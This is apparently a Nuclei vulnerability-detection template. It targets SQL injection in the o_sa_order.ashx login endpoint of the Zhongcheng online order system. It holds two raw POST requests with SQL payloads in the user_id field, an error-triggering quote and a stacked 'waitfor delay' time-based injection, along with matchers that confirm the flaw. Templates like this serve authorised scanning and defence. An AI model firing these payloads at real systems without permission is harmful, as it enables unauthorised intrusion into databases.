id: poc-yaml-zcsoft-o-sa-order-ashx-sqli
info:
  name: 众诚网上订单系统 o_sa_order.ashx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(5,10)}}'
  t2: '{{to_number(t1) + 2}}'

http:
  - raw:
      - |
        POST /ajax/o_sa_order.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        Type=login&user_id=admin'&user_pwd=1111111
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "附近有语法错误"
        part: body
      - type: word
        words:
          - "<"
        part: body
        negative: true

  - raw:
      - |
        POST /ajax/o_sa_order.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        Type=login&user_id=admin');waitfor+delay+'0:0:{{t1}}'--&user_pwd=1111111
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "登陆失败"
        part: body
      - type: word
        words:
          - "<"
        part: body
        negative: true
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
